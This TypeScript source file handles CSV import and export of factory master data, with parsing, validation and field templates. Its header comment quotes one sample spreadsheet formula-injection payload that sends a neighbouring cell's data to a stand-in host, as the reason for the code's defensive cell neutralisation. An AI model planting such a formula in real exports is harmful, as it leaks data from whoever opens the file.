/**
 * CSV import and export for master data.
 *
 * Two security properties are load-bearing here.
 *
 * A cell beginning `=`, `+`, `-`, `@`, tab or carriage return is executable in
 * Excel, LibreOffice and Google Sheets. A material name of
 * `=HYPERLINK("http://x/?"&A1,"click")` exfiltrates the row it sits next to the
 * moment someone opens the export. So every exported cell is neutralised, and
 * imported cells are stripped of the leading trigger rather than being trusted.
 *
 * Imported files are data, never instructions. Nothing in a spreadsheet can
 * grant an approval, set a status or change a rule — an import is an actor of
 * kind `import`, which `canTransitionTo` refuses approval to unconditionally.
 *
 * Beyond that: an import validates before it commits, reports errors per row,
 * and is idempotent on the stable code, so re-running the same file updates
 * rather than duplicating the factory's material library.
 */
import { parseHumanDecimal } from "./decimal";

// ------------------------------------------------------------------- csv io ---

/** RFC 4180 parsing, including quoted fields containing commas and newlines. */
export function parseCsv(text: string, delimiter?: string): string[][] {
  const d = delimiter ?? sniffDelimiter(text);
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let quoted = false;

  // Strip a UTF-8 BOM: Excel writes one, and it otherwise becomes part of the
  // first header name, which then matches nothing.
  const s = text.replace(/^﻿/, "");

  for (let i = 0; i < s.length; i++) {
    const c = s[i];
    if (quoted) {
      if (c === '"') {
        if (s[i + 1] === '"') {
          field += '"';
          i++;
        } else {
          quoted = false;
        }
      } else {
        field += c;
      }
      continue;
    }
    if (c === '"') {
      quoted = true;
    } else if (c === d) {
      row.push(field);
      field = "";
    } else if (c === "\n") {
      row.push(field);
      rows.push(row);
      row = [];
      field = "";
    } else if (c !== "\r") {
      field += c;
    }
  }
  if (field !== "" || row.length > 0) {
    row.push(field);
    rows.push(row);
  }
  return rows.filter((r) => r.some((cell) => cell.trim() !== ""));
}

/**
 * Guess the delimiter from the header line.
 *
 * Semicolon-delimited CSV is the default export of Excel in locales that use a
 * decimal comma, which includes most of the ones this factory buys from.
 */
export function sniffDelimiter(text: string): string {
  const first = text.split(/\r?\n/)[0] ?? "";
  const counts = [",", ";", "\t", "|"].map((d) => ({ d, n: first.split(d).length - 1 }));
  counts.sort((a, b) => b.n - a.n);
  return counts[0].n > 0 ? counts[0].d : ",";
}

const INJECTION_TRIGGERS = /^[=+\-@\t\r]/;

/**
 * Make a cell safe to open in a spreadsheet.
 *
 * Prefixing with an apostrophe is the standard neutralisation: the cell shows
 * its literal text and the formula engine never sees it. Negative numbers are
 * left alone — they start with `-` but are not formulas, and quoting them would
 * break every numeric column in the file.
 */
export function sanitizeCell(value: unknown): string {
  const s = value === null || value === undefined ? "" : String(value);
  if (!s) return "";
  if (/^-?\d+([.,]\d+)?$/.test(s.trim())) return s;
  return INJECTION_TRIGGERS.test(s) ? `'${s}` : s;
}

/**
 * Undo the neutralisation on import.
 *
 * A leading apostrophe means the cell was already escaped by an export, so the
 * rest is the literal value and is restored as-is. An unescaped trigger means
 * the file arrived with a live formula in it, and the trigger is stripped.
 *
 * Either way the stored value is inert: it is data in a JSON file, and any
 * later export re-escapes it through `sanitizeCell`.
 */
export function desanitizeCell(value: string): string {
  if (value.startsWith("'")) return value.slice(1);
  return INJECTION_TRIGGERS.test(value) && !/^-?\d/.test(value)
    ? value.replace(INJECTION_TRIGGERS, "")
    : value;
}

export function toCsv(headers: string[], rows: Record<string, unknown>[]): string {
  const quote = (v: string) => (/[",\n;]/.test(v) ? `"${v.replace(/"/g, '""')}"` : v);
  const lines = [headers.map((h) => quote(sanitizeCell(h))).join(",")];
  for (const row of rows) {
    lines.push(headers.map((h) => quote(sanitizeCell(row[h]))).join(","));
  }
  return lines.join("\n");
}

// ----------------------------------------------------------------- importing ---

export type ImportSeverity = "error" | "warning";

export interface RowIssue {
  /** 1-based, counting the header as row 1, so it matches the spreadsheet. */
  row: number;
  column?: string;
  severity: ImportSeverity;
  message: string;
}

export interface ImportPreview<T> {
  /** Rows that passed validation and would be written. */
  valid: T[];
  /** Rows that failed. Never written, whatever the user chooses. */
  invalidRows: number[];
  issues: RowIssue[];
  /** Existing codes these rows would update rather than create. */
  updates: string[];
  creates: string[];
  headers: string[];
  unmappedHeaders: string[];
}

export interface FieldSpec {
  /** Canonical field name on the target record. */
  field: string;
  /** Header names accepted for it, lower-cased and compared loosely. */
  aliases: string[];
  required?: boolean;
  kind?: "text" | "decimal" | "integer" | "boolean" | "list";
}

const norm = (s: string) => s.trim().toLowerCase().replace(/[\s_\-.]+/g, "");

/**
 * Parse and validate rows without writing anything.
 *
 * Separating preview from commit is what makes a bad import survivable: the
 * user sees exactly which rows would fail and why, and chooses whether to take
 * the good ones, before anything touches the library.
 */
export function previewImport<T extends Record<string, unknown>>(
  text: string,
  specs: FieldSpec[],
  existingCodes: string[] = [],
  opts: { codeField?: string } = {},
): ImportPreview<T> {
  return previewImportRows<T>(parseCsv(text), specs, existingCodes, opts);
}

/**
 * Same validation as {@link previewImport}, starting from already-split rows.
 *
 * The shared entry point for CSV (via `parseCsv`) and `.xlsx` (via a workbook
 * reader that has no reason to live in this package, since it needs a real
 * spreadsheet engine) — both end up as `string[][]` and are validated by
 * exactly the same rules, so an import behaves identically whichever format a
 * supplier happened to send.
 */
export function previewImportRows<T extends Record<string, unknown>>(
  rows: string[][],
  specs: FieldSpec[],
  existingCodes: string[] = [],
  opts: {
    codeField?: string;
    /**
     * A denormalized one-row-per-child-line format (packaging BOM lines: many
     * rows legitimately share one `bomCode`) is not a code collision — it is
     * the format. Set this to skip the repeated-code check for that file.
     */
    allowRepeatedCode?: boolean;
  } = {},
): ImportPreview<T> {
  const codeField = opts.codeField ?? "code";
  const issues: RowIssue[] = [];

  if (rows.length === 0) {
    return {
      valid: [],
      invalidRows: [],
      issues: [{ row: 1, severity: "error", message: "The file is empty." }],
      updates: [],
      creates: [],
      headers: [],
      unmappedHeaders: [],
    };
  }

  const headers = rows[0].map((h) => desanitizeCell(h).trim());
  const columnFor = new Map<number, FieldSpec>();
  const unmapped: string[] = [];

  headers.forEach((header, i) => {
    const spec = specs.find(
      (s) => norm(s.field) === norm(header) || s.aliases.some((a) => norm(a) === norm(header)),
    );
    if (spec) columnFor.set(i, spec);
    else if (header) unmapped.push(header);
  });

  for (const spec of specs.filter((s) => s.required)) {
    if (![...columnFor.values()].includes(spec)) {
      issues.push({
        row: 1,
        column: spec.field,
        severity: "error",
        message: `Required column "${spec.field}" is missing. Accepted headings: ${[spec.field, ...spec.aliases].join(", ")}.`,
      });
    }
  }

  const valid: T[] = [];
  const invalidRows: number[] = [];
  const updates: string[] = [];
  const creates: string[] = [];
  const existing = new Set(existingCodes);
  const seenInFile = new Set<string>();

  for (let r = 1; r < rows.length; r++) {
    const rowNumber = r + 1;
    const record: Record<string, unknown> = {};
    let rowFailed = false;

    rows[r].forEach((raw, i) => {
      const spec = columnFor.get(i);
      if (!spec) return;
      const cell = desanitizeCell(raw).trim();
      if (cell === "") {
        if (spec.required) {
          issues.push({
            row: rowNumber,
            column: spec.field,
            severity: "error",
            message: `"${spec.field}" is required and is empty.`,
          });
          rowFailed = true;
        }
        return;
      }

      switch (spec.kind) {
        case "decimal": {
          const d = parseHumanDecimal(cell);
          if (!d) {
            issues.push({
              row: rowNumber,
              column: spec.field,
              severity: "error",
              message: `"${cell}" is not a number.`,
            });
            rowFailed = true;
          } else {
            record[spec.field] = d.toString();
          }
          break;
        }
        case "integer": {
          const n = Number.parseInt(cell.replace(/[^\d-]/g, ""), 10);
          if (Number.isNaN(n)) {
            issues.push({
              row: rowNumber,
              column: spec.field,
              severity: "error",
              message: `"${cell}" is not a whole number.`,
            });
            rowFailed = true;
          } else {
            record[spec.field] = n;
          }
          break;
        }
        case "boolean":
          record[spec.field] = /^(y|yes|true|1|evet|ja|oui)$/i.test(cell);
          break;
        case "list":
          record[spec.field] = cell
            .split(/[;,|]/)
            .map((v) => v.trim())
            .filter(Boolean);
          break;
        default:
          record[spec.field] = cell;
      }
    });

    const code = String(record[codeField] ?? "").trim();
    if (!code) {
      issues.push({
        row: rowNumber,
        column: codeField,
        severity: "error",
        message: `No ${codeField}: rows are matched on it, so a row without one cannot be imported safely.`,
      });
      rowFailed = true;
    } else if (seenInFile.has(code) && !opts.allowRepeatedCode) {
      issues.push({
        row: rowNumber,
        column: codeField,
        severity: "error",
        message: `${codeField} "${code}" appears more than once in this file.`,
      });
      rowFailed = true;
    }

    if (rowFailed) {
      invalidRows.push(rowNumber);
      continue;
    }

    seenInFile.add(code);
    (existing.has(code) ? updates : creates).push(code);
    if (existing.has(code)) {
      issues.push({
        row: rowNumber,
        column: codeField,
        severity: "warning",
        message: `"${code}" already exists and will be updated, not duplicated.`,
      });
    }
    valid.push(record as T);
  }

  return { valid, invalidRows, issues, updates, creates, headers, unmappedHeaders: unmapped };
}

// ------------------------------------------------------------------ templates ---

export const MATERIAL_FIELDS: FieldSpec[] = [
  { field: "code", aliases: ["material code", "internal code", "kod", "malzeme kodu"], required: true },
  { field: "displayName", aliases: ["name", "material", "display name", "ad", "malzeme"], required: true },
  { field: "tradeName", aliases: ["trade name", "ticari ad", "commercial name"] },
  { field: "inciName", aliases: ["inci", "inci name"] },
  { field: "casNumbers", aliases: ["cas", "cas number", "cas no"], kind: "list" },
  { field: "ecNumbers", aliases: ["ec", "ec number"], kind: "list" },
  { field: "manufacturer", aliases: ["producer", "uretici"] },
  { field: "countryOfOrigin", aliases: ["country", "origin", "mense"] },
  { field: "physicalForm", aliases: ["form", "physical form", "fiziksel form"] },
  { field: "activeMatterPercent", aliases: ["active", "active matter", "active %", "aktif madde"], kind: "decimal" },
  { field: "solidsPercent", aliases: ["solids", "solids %"], kind: "decimal" },
  { field: "density", aliases: ["density", "yogunluk", "sg", "specific gravity"], kind: "decimal" },
  { field: "phMin", aliases: ["ph min", "min ph"], kind: "decimal" },
  { field: "phMax", aliases: ["ph max", "max ph"], kind: "decimal" },
  { field: "hlb", aliases: ["hlb"], kind: "decimal" },
  { field: "ionicCharacter", aliases: ["ionic", "ionic character", "charge"] },
  { field: "functions", aliases: ["function", "functions", "role", "islev"], kind: "list" },
  { field: "recommendedMinPercent", aliases: ["min %", "min use", "recommended min"], kind: "decimal" },
  { field: "recommendedMaxPercent", aliases: ["max %", "max use", "recommended max"], kind: "decimal" },
  { field: "technicalMaxPercent", aliases: ["technical max", "teknik maks"], kind: "decimal" },
  { field: "shelfLifeMonths", aliases: ["shelf life", "shelf life months"], kind: "integer" },
  { field: "storageConditions", aliases: ["storage", "storage conditions"] },
  { field: "notes", aliases: ["note", "notes", "not"] },
  { field: "active", aliases: ["active record", "in use", "is active"], kind: "boolean" },
];

export const SUPPLIER_FIELDS: FieldSpec[] = [
  { field: "code", aliases: ["supplier code", "kod"], required: true },
  { field: "displayName", aliases: ["name", "supplier", "display name", "tedarikci"], required: true },
  { field: "legalName", aliases: ["legal name", "company", "unvan"] },
  { field: "country", aliases: ["country", "ulke"] },
  { field: "contactPerson", aliases: ["contact", "contact person"] },
  { field: "email", aliases: ["email", "e-mail", "eposta"] },
  { field: "phone", aliases: ["phone", "tel", "telefon"] },
  { field: "currency", aliases: ["currency", "para birimi"] },
  { field: "incoterm", aliases: ["incoterm", "incoterms"] },
  { field: "paymentTerms", aliases: ["payment terms", "odeme"] },
  { field: "defaultLeadTimeDays", aliases: ["lead time", "lead time days"], kind: "integer" },
  { field: "notes", aliases: ["notes", "not"] },
];

export const PRICE_FIELDS: FieldSpec[] = [
  { field: "code", aliases: ["price code", "record code", "id"], required: true },
  { field: "materialCode", aliases: ["material code", "material", "malzeme kodu"], required: true },
  { field: "supplierCode", aliases: ["supplier code", "supplier", "tedarikci"] },
  { field: "price", aliases: ["price", "unit price", "fiyat"], kind: "decimal", required: true },
  { field: "currency", aliases: ["currency", "para birimi"], required: true },
  { field: "priceUnit", aliases: ["unit", "price unit", "birim"] },
  { field: "moq", aliases: ["moq", "minimum order"], kind: "decimal" },
  { field: "effectiveFrom", aliases: ["date", "effective from", "valid from", "tarih"], required: true },
  { field: "effectiveTo", aliases: ["effective to", "valid to", "expiry"] },
  { field: "incoterm", aliases: ["incoterm"] },
  { field: "freight", aliases: ["freight", "navlun"], kind: "decimal" },
  { field: "insurance", aliases: ["insurance", "sigorta"], kind: "decimal" },
  { field: "duty", aliases: ["duty", "import duty", "gumruk"], kind: "decimal" },
  { field: "tax", aliases: ["tax", "vat", "vergi"], kind: "decimal" },
  { field: "portCharges", aliases: ["port", "port charges", "liman"], kind: "decimal" },
  { field: "inlandTransport", aliases: ["inland", "inland transport"], kind: "decimal" },
  { field: "otherCost", aliases: ["other", "other cost"], kind: "decimal" },
  { field: "allocationBasis", aliases: ["allocation", "basis", "cost basis"] },
  { field: "shipmentQuantity", aliases: ["shipment qty", "shipment quantity"], kind: "decimal" },
  { field: "expectedLossPercent", aliases: ["loss", "expected loss"], kind: "decimal" },
  { field: "quotationRef", aliases: ["quotation", "quote ref", "teklif"] },
  { field: "notes", aliases: ["notes", "not"] },
];

export const INVENTORY_FIELDS: FieldSpec[] = [
  { field: "code", aliases: ["record code", "id"], required: true },
  { field: "materialCode", aliases: ["material code", "material"], required: true },
  { field: "warehouse", aliases: ["warehouse", "depo", "location"] },
  { field: "lot", aliases: ["lot", "batch", "parti"] },
  { field: "supplierLot", aliases: ["supplier lot"] },
  { field: "quantity", aliases: ["quantity", "qty", "miktar"], kind: "decimal", required: true },
  { field: "unit", aliases: ["unit", "birim"] },
  { field: "reservedQuantity", aliases: ["reserved", "reserved quantity"], kind: "decimal" },
  { field: "manufacturedAt", aliases: ["manufactured", "production date", "uretim tarihi"] },
  { field: "expiresAt", aliases: ["expiry", "expires", "skt"] },
  { field: "unitCost", aliases: ["unit cost", "cost"], kind: "decimal" },
  { field: "currency", aliases: ["currency"] },
  { field: "quarantined", aliases: ["quarantine", "quarantined"], kind: "boolean" },
  { field: "released", aliases: ["released", "qc released"], kind: "boolean" },
];

export const MATERIAL_SUPPLIER_FIELDS: FieldSpec[] = [
  { field: "code", aliases: ["link code", "id"], required: true },
  { field: "materialCode", aliases: ["material code", "material"], required: true },
  { field: "supplierCode", aliases: ["supplier code", "supplier"], required: true },
  { field: "supplierTradeName", aliases: ["trade name", "supplier trade name"] },
  { field: "supplierMaterialCode", aliases: ["supplier material code", "their code"] },
  { field: "preferred", aliases: ["preferred"], kind: "boolean" },
  { field: "qualified", aliases: ["qualified", "approved"], kind: "boolean" },
];

export const SUBSTITUTE_FIELDS: FieldSpec[] = [
  { field: "code", aliases: ["id"], required: true },
  { field: "materialCode", aliases: ["material code", "material"], required: true },
  { field: "substituteCode", aliases: ["substitute", "substitute code", "alternative"], required: true },
  { field: "notes", aliases: ["notes", "reason"] },
];

export const MATERIAL_FUNCTION_FIELDS: FieldSpec[] = [
  { field: "code", aliases: ["id"], required: true },
  { field: "materialCode", aliases: ["material code", "material"], required: true },
  { field: "function", aliases: ["function", "role"], required: true },
];

export const PACKAGING_COMPONENT_FIELDS: FieldSpec[] = [
  { field: "code", aliases: ["component code", "kod"], required: true },
  { field: "description", aliases: ["description", "name", "aciklama"], required: true },
  { field: "componentType", aliases: ["type", "component type", "tur"], required: true },
  { field: "supplierCode", aliases: ["supplier code", "supplier", "tedarikci"] },
  { field: "unit", aliases: ["unit", "birim"] },
  { field: "unitPrice", aliases: ["unit price", "price", "fiyat"], kind: "decimal" },
  { field: "currency", aliases: ["currency", "para birimi"] },
  { field: "moq", aliases: ["moq", "minimum order"], kind: "decimal" },
  { field: "effectiveFrom", aliases: ["effective from", "date", "tarih"] },
  { field: "weightG", aliases: ["weight", "weight g", "agirlik"], kind: "decimal" },
  { field: "materialType", aliases: ["material type", "malzeme turu"] },
  { field: "wasteFactorPercent", aliases: ["waste factor", "waste %", "fire"], kind: "decimal" },
  { field: "notes", aliases: ["notes", "not"] },
  { field: "active", aliases: ["active", "aktif"], kind: "boolean" },
];

export const FACTORY_PROFILE_FIELDS: FieldSpec[] = [
  { field: "code", aliases: ["profile code", "kod"], required: true },
  { field: "name", aliases: ["name", "ad"], required: true },
  { field: "currency", aliases: ["currency", "para birimi"] },
  { field: "electricityPerKwh", aliases: ["electricity", "electricity per kwh"], kind: "decimal" },
  { field: "waterPerM3", aliases: ["water", "water per m3"], kind: "decimal" },
  { field: "steamPerKg", aliases: ["steam", "steam per kg"], kind: "decimal" },
  { field: "compressedAirPerBatch", aliases: ["compressed air", "air per batch"], kind: "decimal" },
  { field: "directLabourPerHour", aliases: ["labour rate", "labor rate", "direct labour per hour"], kind: "decimal" },
  { field: "labourHoursPerBatch", aliases: ["labour hours per batch", "labor hours"], kind: "decimal" },
  { field: "kwhPerBatch", aliases: ["kwh per batch"], kind: "decimal" },
  { field: "waterM3PerBatch", aliases: ["water m3 per batch"], kind: "decimal" },
  { field: "steamKgPerBatch", aliases: ["steam kg per batch"], kind: "decimal" },
  { field: "qcCostPerBatch", aliases: ["qc cost per batch"], kind: "decimal" },
  { field: "qcPercentOfBatch", aliases: ["qc percent"], kind: "decimal" },
  { field: "processLossPercent", aliases: ["process loss", "process loss %"], kind: "decimal" },
  { field: "wasteDisposalPerBatch", aliases: ["waste disposal"], kind: "decimal" },
  { field: "overheadPercent", aliases: ["overhead %", "overhead percent"], kind: "decimal" },
  { field: "overheadPerBatch", aliases: ["overhead per batch"], kind: "decimal" },
  { field: "effectiveFrom", aliases: ["effective from", "date", "tarih"], required: true },
  { field: "verification", aliases: ["verification", "verification status"] },
  { field: "notes", aliases: ["notes", "not"] },
];

/**
 * One row per (BOM, component) pair — a packaging BOM is a nested structure,
 * so rows sharing a `bomCode` are aggregated into a single BOM record with
 * `aggregateBomRows` after validation, rather than validated as a flat table.
 */
export const PACKAGING_BOM_LINE_FIELDS: FieldSpec[] = [
  { field: "bomCode", aliases: ["bom code", "bom"], required: true },
  { field: "skuCode", aliases: ["sku code", "sku"], required: true },
  { field: "componentCode", aliases: ["component code", "component"], required: true },
  { field: "quantityPerUnit", aliases: ["quantity per unit", "qty per unit", "quantity"], kind: "decimal" },
  // Not required per-row: a BOM's fill quantity is a header fact that only
  // needs to appear on one row of the group (see `aggregateBomRows`).
  { field: "fillQuantity", aliases: ["fill quantity", "fill"], kind: "decimal" },
  { field: "fillUnit", aliases: ["fill unit"] },
  { field: "fillLossPercent", aliases: ["fill loss", "fill loss %"], kind: "decimal" },
  { field: "unitsPerCase", aliases: ["units per case", "case pack"], kind: "integer" },
  { field: "notes", aliases: ["notes", "not"] },
];

/**
 * Group validated BOM-line rows into packaging BOM records, one per
 * `bomCode`. The header fields (fill quantity, fill unit, ...) are read from
 * each row so any row may carry them; the first non-empty value for the BOM
 * wins, keeping a spreadsheet where only the first line repeats them valid.
 */
export function aggregateBomRows(
  rows: Record<string, unknown>[],
): { code: string; skuCode: string; fillQuantity: string; fillUnit: string; fillLossPercent: string; unitsPerCase?: number; lines: { componentCode: string; quantityPerUnit: string; notes?: string }[] }[] {
  const byCode = new Map<string, Record<string, unknown>[]>();
  for (const row of rows) {
    const code = String(row.bomCode ?? "");
    if (!byCode.has(code)) byCode.set(code, []);
    byCode.get(code)!.push(row);
  }
  return [...byCode.entries()].map(([code, group]) => {
    const first = group.find((r) => r.fillQuantity) ?? group[0];
    return {
      code,
      skuCode: String(first.skuCode ?? ""),
      fillQuantity: String(first.fillQuantity ?? "0"),
      fillUnit: String(first.fillUnit ?? "ml"),
      fillLossPercent: String(first.fillLossPercent ?? "0"),
      unitsPerCase: typeof first.unitsPerCase === "number" ? first.unitsPerCase : undefined,
      lines: group.map((r) => ({
        componentCode: String(r.componentCode ?? ""),
        quantityPerUnit: String(r.quantityPerUnit ?? "1"),
        notes: r.notes ? String(r.notes) : undefined,
      })),
    };
  });
}

/** Header row for a blank template file. */
export function templateCsv(specs: FieldSpec[]): string {
  return specs.map((s) => s.field).join(",");
}
